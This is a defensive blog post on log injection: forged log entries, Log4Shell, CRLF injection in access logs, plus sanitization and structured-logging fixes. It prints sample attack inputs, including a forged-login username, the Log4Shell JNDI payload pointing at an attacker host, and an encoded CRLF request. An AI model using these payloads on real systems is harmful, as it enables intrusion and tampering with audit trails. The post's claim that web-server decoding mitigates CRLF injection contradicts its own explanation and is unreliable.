---
title: "🪵 Log Injection: When Your Logs Are Lying to You"
date: 2026-06-08
excerpt: "You trust your logs like a lie detector. But what if an attacker controls what gets written? Log injection turns your audit trail into fiction — and you won't even know it."
tags:
  - security
  - web-vulnerabilities
  - logging
  - appsec
  - devops
featured: true
---

Logs are sacred. When production blows up at 2 AM, logs are the first thing you reach for. They're your flight recorder, your witness, your alibi. So what happens when an attacker writes the logs themselves?

That's log injection: a class of web vulnerability where user-controlled input ends up written directly into log files — without sanitization — letting attackers forge log entries, hide their tracks, or in the worst case, compromise the machines reading those logs.

It sounds boring. It is not.

## The Basic Problem

Here's a typical Node.js endpoint. Nothing dramatic:

```javascript
app.post('/login', (req, res) => {
  const { username } = req.body;
  logger.info(`Login attempt for user: ${username}`);

  // ... auth logic
});
```

Normal usage: `Login attempt for user: alice` — totally fine.

Attacker usage — submit username as:

```
alice
2026-06-08T02:00:00Z [INFO] Login successful for user: admin
```

Now your log file contains:

```
2026-06-08T01:59:58Z [INFO] Login attempt for user: alice
2026-06-08T02:00:00Z [INFO] Login successful for user: admin
```

That second line? The attacker wrote it. Your SIEM, your on-call engineer, your compliance auditor — everyone reading those logs is now looking at fiction. The attacker logs in as `admin`, crafts a fake success entry beforehand, and when someone reviews the audit trail later, it looks like a legitimate session.

Welcome to log forgery.

## Why Logs Are a High-Value Target

Logs are typically trusted implicitly. Monitoring pipelines ingest them without question. Security tools run analytics on them. Incident responders base their timeline reconstructions on them. If an attacker can control log output, they can:

1. **Cover their tracks** — insert fake "access denied" entries around their real actions
2. **Confuse forensics** — flood logs with junk to bury the needle in a haystack
3. **Trigger false alarms** — write entries that fire your SIEM alerts and exhaust your on-call team
4. **Exploit log parsers** — inject control characters that break log viewers or exploit downstream parsers

That last one is where it gets spicy.

## Log4Shell Was Log Injection's Evil Twin

You remember Log4Shell (CVE-2021-44228)? The vulnerability that had the entire industry patching on a Friday night in December 2021?

At its core, it was log injection gone catastrophic. Log4j had a feature called message lookup substitution — it would evaluate JNDI expressions found in logged strings. An attacker sent:

```
${jndi:ldap://attacker.com/exploit}
```

…as a user-agent header. The server logged it. Log4j evaluated it. Remote code execution achieved.

That's the extreme end: log injection → arbitrary code execution because the logging library itself was trusting user input. But you don't need Log4Shell-level drama for log injection to hurt you. Plain log forgery is already bad.

## A Real Pattern We Fixed at Cubet

On a client project at Cubet, we were building an internal audit system — every API call was logged with the authenticated user's email. During a security review, we realised the email address was logged verbatim with zero sanitization.

Our log line looked like this:

```python
logger.info(f"[AUDIT] user={user_email} action={action} resource={resource_id}")
```

Since `user_email` came from a JWT claim that was validated server-side, it felt safe. But the JWT was issued by a third-party identity provider, and there was no check that the email field didn't contain newlines or log-special characters. An attacker with a crafted identity token could have injected arbitrary log lines.

The fix was simple — strip or encode control characters before logging:

```python
import re

def sanitize_for_log(value: str) -> str:
    # Remove newlines, carriage returns, and other control characters
    return re.sub(r'[\r\n\x00-\x1f\x7f]', '', str(value))

logger.info(
    "[AUDIT] user=%s action=%s resource=%s",
    sanitize_for_log(user_email),
    sanitize_for_log(action),
    sanitize_for_log(resource_id)
)
```

One regex, done. The log format also switched to structured JSON logging (`python-json-logger`) shortly after, which makes this class of attack much harder — newlines in a JSON string value don't create new log entries.

## The Structural Fix: Stop Logging Strings

The best defence against log injection is to stop building log messages by string concatenation. Use **structured logging** instead.

Compare:

```javascript
// Bad — injectable
logger.info(`User ${username} performed ${action} on ${resource}`);

// Good — structured
logger.info('user_action', {
  username: username,
  action: action,
  resource: resource,
});
```

In the structured version, `username` is a value inside a JSON object. A newline in `username` doesn't create a new log entry — it's just a string value with a newline character in it. Your log shipper (Filebeat, Fluentd, whatever) reads the JSON object as a unit. Log parsers that understand JSON aren't fooled.

Winston, Pino, structlog, zerolog, slog — virtually every modern logging library supports structured output. If you're still doing string interpolation into log messages in 2026, you're leaving this door open.

## CRLF Injection in HTTP Logs

One more variant worth knowing: CRLF injection in web server access logs. HTTP access logs typically write one line per request, with fields separated by spaces. If an attacker sends a URL like:

```
GET /page%0d%0a127.0.0.1 - - [08/Jun/2026] "GET /admin HTTP/1.1" 200 HTTP/1.1
```

And the URL gets URL-decoded before logging, the `%0d%0a` (CRLF) creates a new line in the access log that looks like a second, totally separate request — in this case a fake successful `GET /admin`.

Nginx and Apache in modern configurations decode percent-encoding in logged values, so this is largely mitigated in default setups. But if you have custom access log pipelines or application-layer request logging, test it.

## Quick Checklist

- **Never interpolate user input directly** into log strings — use parameterised/structured logging
- **Strip or encode control characters** (`\n`, `\r`, `\0`) from any user-supplied value before it touches a log
- **Use JSON-structured logging** — it makes injection structurally harder and makes your logs machine-parseable as a bonus
- **Treat your log pipeline as a security boundary** — don't trust log content when building SIEM rules; normalise inputs first
- **Audit your JNDI / lookup features** if you run any JVM-based logging (yes, this is still a thing in 2026 for legacy stacks)

## Logs Shouldn't Be a Weapon

Here's the uncomfortable truth: most teams treat logs as a development convenience and an ops tool, not a security surface. Attackers know this. Logs have low scrutiny and high trust, which is exactly the combination an attacker wants to exploit.

Structured logging, input sanitization, and treating your logging pipeline with the same respect you give your database queries — that's the fix. It's not glamorous. It won't make a conference talk. But it'll mean that when something does go wrong, your logs are actually telling you the truth.

And at 2 AM, that matters a lot.

---

Found this useful? I write about web security, backend engineering, and the parts of production nobody warns you about. Find me on [GitHub](https://github.com/kpanuragh) or connect on [LinkedIn](https://linkedin.com/in/kpanuragh) — I'd love to hear what's in your log files.
